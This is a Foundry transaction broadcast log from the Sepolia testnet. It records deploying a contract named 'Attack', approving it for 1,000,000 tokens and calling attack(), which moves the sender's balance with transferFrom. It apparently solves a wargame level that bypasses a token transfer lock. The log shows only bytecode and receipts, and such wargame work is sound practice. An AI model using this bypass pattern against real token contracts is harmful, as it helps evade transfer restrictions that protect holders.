{
  "transactions": [
    {
      "hash": "0xdece794254c56c926f08ce3a5091d641e26a203cef09e28bf8468a9c40498877",
      "transactionType": "CREATE",
      "contractName": "Attack",
      "contractAddress": "0x83694fe2b46024a49deedc565d0b7e2b28bea2e1",
      "function": null,
      "arguments": [
        "0xb23f374Eb589ADDE9Df9001FC0cEc7DcdB26eFfD",
        "0x8fe205351ADE3b32245FFcBa2F58141Fa3B0a20F"
      ],
      "transaction": {
        "from": "0x8fe205351ade3b32245ffcba2f58141fa3b0a20f",
        "gas": "0x6d4f7",
        "value": "0x0",
        "input": "0x608060405234801561000f575f5ffd5b506040516105b83803806105b883398181016040528101906100319190610115565b815f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610153565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e4826100bb565b9050919050565b6100f4816100da565b81146100fe575f5ffd5b50565b5f8151905061010f816100eb565b92915050565b5f5f6040838503121561012b5761012a6100b7565b5b5f61013885828601610101565b925050602061014985828601610101565b9150509250929050565b610458806101605f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c806348db5f89146100435780639e5faafc14610061578063fc0c546a1461006b575b5f5ffd5b61004b610089565b604051610058919061028f565b60405180910390f35b6100696100ae565b005b61007361022c565b6040516100809190610303565b60405180910390f35b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a0823160015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401610129919061028f565b602060405180830381865afa158015610144573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101689190610353565b90505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1630846040518463ffffffff1660e01b81526004016101e89392919061038d565b6020604051808303815f875af1158015610204573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061022891906103f7565b5050565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61027982610250565b9050919050565b6102898161026f565b82525050565b5f6020820190506102a25f830184610280565b92915050565b5f819050919050565b5f6102cb6102c66102c184610250565b6102a8565b610250565b9050919050565b5f6102dc826102b1565b9050919050565b5f6102ed826102d2565b9050919050565b6102fd816102e3565b82525050565b5f6020820190506103165f8301846102f4565b92915050565b5f5ffd5b5f819050919050565b61033281610320565b811461033c575f5ffd5b50565b5f8151905061034d81610329565b92915050565b5f602082840312156103685761036761031c565b5b5f6103758482850161033f565b91505092915050565b61038781610320565b82525050565b5f6060820190506103a05f830186610280565b6103ad6020830185610280565b6103ba604083018461037e565b949350505050565b5f8115159050919050565b6103d6816103c2565b81146103e0575f5ffd5b50565b5f815190506103f1816103cd565b92915050565b5f6020828403121561040c5761040b61031c565b5b5f610419848285016103e3565b9150509291505056fea2646970667358221220efd3fce3be7b5c1650bfef51a6730519f96624dfb38c25006f1ead1708e0aae964736f6c634300081d0033000000000000000000000000b23f374eb589adde9df9001fc0cec7dcdb26effd0000000000000000000000008fe205351ade3b32245ffcba2f58141fa3b0a20f",
        "nonce": "0xb9",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xf2bfe91191176f82d8d5e4b69deab687c7e2a2a15615c565979ef7c59d29a854",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb23f374eb589adde9df9001fc0cec7dcdb26effd",
      "function": "approve(address,uint256)",
      "arguments": [
        "0x83694fE2B46024A49dEEdc565d0B7e2b28bEa2E1",
        "1000000000000000000000000"
      ],
      "transaction": {
        "from": "0x8fe205351ade3b32245ffcba2f58141fa3b0a20f",
        "to": "0xb23f374eb589adde9df9001fc0cec7dcdb26effd",
        "gas": "0xf9c8",
        "value": "0x0",
        "input": "0x095ea7b300000000000000000000000083694fe2b46024a49deedc565d0b7e2b28bea2e100000000000000000000000000000000000000000000d3c21bcecceda1000000",
        "nonce": "0xba",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x9760b8988540b75f99c388cadef686eae1ceb822679b15ab971ae4a90a192e4a",
      "transactionType": "CALL",
      "contractName": "Attack",
      "contractAddress": "0x83694fe2b46024a49deedc565d0b7e2b28bea2e1",
      "function": "attack()",
      "arguments": [],
      "transaction": {
        "from": "0x8fe205351ade3b32245ffcba2f58141fa3b0a20f",
        "to": "0x83694fe2b46024a49deedc565d0b7e2b28bea2e1",
        "gas": "0x13a4c",
        "value": "0x0",
        "input": "0x9e5faafc",
        "nonce": "0xbb",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x2331341",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0xdece794254c56c926f08ce3a5091d641e26a203cef09e28bf8468a9c40498877",
      "transactionIndex": "0xbf",
      "blockHash": "0xe22275451fa827c20aac8870ab1849457d4cc7e0936d42ee8a0d9757cc74330d",
      "blockNumber": "0x84ea71",
      "gasUsed": "0x5415c",
      "effectiveGasPrice": "0x1cec5b",
      "from": "0x8fe205351ade3b32245ffcba2f58141fa3b0a20f",
      "to": null,
      "contractAddress": "0x83694fe2b46024a49deedc565d0b7e2b28bea2e1"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x233c818",
      "logs": [
        {
          "address": "0xb23f374eb589adde9df9001fc0cec7dcdb26effd",
          "topics": [
            "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925",
            "0x0000000000000000000000008fe205351ade3b32245ffcba2f58141fa3b0a20f",
            "0x00000000000000000000000083694fe2b46024a49deedc565d0b7e2b28bea2e1"
          ],
          "data": "0x00000000000000000000000000000000000000000000d3c21bcecceda1000000",
          "blockHash": "0xe22275451fa827c20aac8870ab1849457d4cc7e0936d42ee8a0d9757cc74330d",
          "blockNumber": "0x84ea71",
          "blockTimestamp": "0x686b8324",
          "transactionHash": "0xf2bfe91191176f82d8d5e4b69deab687c7e2a2a15615c565979ef7c59d29a854",
          "transactionIndex": "0xc0",
          "logIndex": "0x1b6",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000010200000000000000000000200000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000440000000000000000000000000008000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000001000",
      "type": "0x2",
      "transactionHash": "0xf2bfe91191176f82d8d5e4b69deab687c7e2a2a15615c565979ef7c59d29a854",
      "transactionIndex": "0xc0",
      "blockHash": "0xe22275451fa827c20aac8870ab1849457d4cc7e0936d42ee8a0d9757cc74330d",
      "blockNumber": "0x84ea71",
      "gasUsed": "0xb4d7",
      "effectiveGasPrice": "0x1cec5b",
      "from": "0x8fe205351ade3b32245ffcba2f58141fa3b0a20f",
      "to": "0xb23f374eb589adde9df9001fc0cec7dcdb26effd",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x23c94ed",
      "logs": [
        {
          "address": "0xb23f374eb589adde9df9001fc0cec7dcdb26effd",
          "topics": [
            "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925",
            "0x0000000000000000000000008fe205351ade3b32245ffcba2f58141fa3b0a20f",
            "0x00000000000000000000000083694fe2b46024a49deedc565d0b7e2b28bea2e1"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0xe22275451fa827c20aac8870ab1849457d4cc7e0936d42ee8a0d9757cc74330d",
          "blockNumber": "0x84ea71",
          "blockTimestamp": "0x686b8324",
          "transactionHash": "0x9760b8988540b75f99c388cadef686eae1ceb822679b15ab971ae4a90a192e4a",
          "transactionIndex": "0xc2",
          "logIndex": "0x1d7",
          "removed": false
        },
        {
          "address": "0xb23f374eb589adde9df9001fc0cec7dcdb26effd",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x0000000000000000000000008fe205351ade3b32245ffcba2f58141fa3b0a20f",
            "0x00000000000000000000000083694fe2b46024a49deedc565d0b7e2b28bea2e1"
          ],
          "data": "0x00000000000000000000000000000000000000000000d3c21bcecceda1000000",
          "blockHash": "0xe22275451fa827c20aac8870ab1849457d4cc7e0936d42ee8a0d9757cc74330d",
          "blockNumber": "0x84ea71",
          "blockTimestamp": "0x686b8324",
          "transactionHash": "0x9760b8988540b75f99c388cadef686eae1ceb822679b15ab971ae4a90a192e4a",
          "transactionIndex": "0xc2",
          "logIndex": "0x1d8",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000010200000000000000000000200000000000000000000000000008000000000000000000000000000000000200000000000000000000000000000000000000000000000440000000000010000000000000008000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000080000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000001000",
      "type": "0x2",
      "transactionHash": "0x9760b8988540b75f99c388cadef686eae1ceb822679b15ab971ae4a90a192e4a",
      "transactionIndex": "0xc2",
      "blockHash": "0xe22275451fa827c20aac8870ab1849457d4cc7e0936d42ee8a0d9757cc74330d",
      "blockNumber": "0x84ea71",
      "gasUsed": "0xe38d",
      "effectiveGasPrice": "0x1cec5b",
      "from": "0x8fe205351ade3b32245ffcba2f58141fa3b0a20f",
      "to": "0x83694fe2b46024a49deedc565d0b7e2b28bea2e1",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1751876389,
  "chain": 11155111,
  "commit": "bda9672"
}